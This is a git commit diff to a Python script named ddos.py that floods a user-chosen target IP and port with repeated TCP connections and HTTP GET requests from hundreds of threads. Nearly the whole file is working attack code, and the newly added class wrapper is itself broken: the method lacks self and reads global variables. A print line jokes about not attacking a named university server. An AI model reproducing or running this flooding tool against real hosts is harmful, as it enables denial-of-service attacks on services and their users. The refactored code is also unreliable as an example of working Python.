66c04f53984317cbc62bdeb7ab1672351392c142
omar <umarfarooqa16@gmail.com>
2021-03-30 23:11:56 +0530

    classes

--- ddos.py
+++ ddos.py
@@ -3,24 +3,33 @@
 
 import socket
 import threading
+import sys, os, time, shodan
+
+
+class Dedos(target,port,host):
+    def __init__(self,target,port,host):
+        self.target = target
+        self.port = port
+        self.host = host
+    def attack():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target,port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
+            s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
+            s.close()
 
 print("\n\n\n Dont try this on eduserver or nitc.ac.in please :) \n\n\n ")
 target = str(input("Target IP : "))
 port = input("port : ")
-host= str(input("Host IP : ")) 
+host= str(input("Host IP : "))
 
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target,port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
-        s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
-        s.close()
+dummy = Dedos(target,port,host)
 
 #threads
 
 n = int(input("No of threads to be used(suggested 500) :"))
 
 for i in range(n):
-    thread = threading.Thread(target=attack)
+    thread = threading.Thread(target=dummy.attack)
     thread.start()
